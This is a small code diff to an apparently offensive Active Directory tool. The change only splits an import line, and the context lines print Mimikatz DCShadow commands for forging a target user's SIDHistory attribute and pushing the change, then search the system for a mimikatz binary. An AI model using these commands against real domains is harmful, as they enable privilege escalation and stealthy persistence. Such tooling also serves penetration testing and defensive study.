@@ -31,7 +31,8 @@ def run(args: Any) -> int:
     print("  # Terminal 1 (SYSTEM): lsadump::dcshadow /object:targetUser /attribute:SIDHistory /value:<SID>")
     print("  # Terminal 2 (DA): lsadump::dcshadow /push")
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     mimikatz = shutil.which("mimikatz") or shutil.which("mimikatz.exe")
     if mimikatz:
         print("\n[*] Mimikatz found: {}".format(mimikatz))
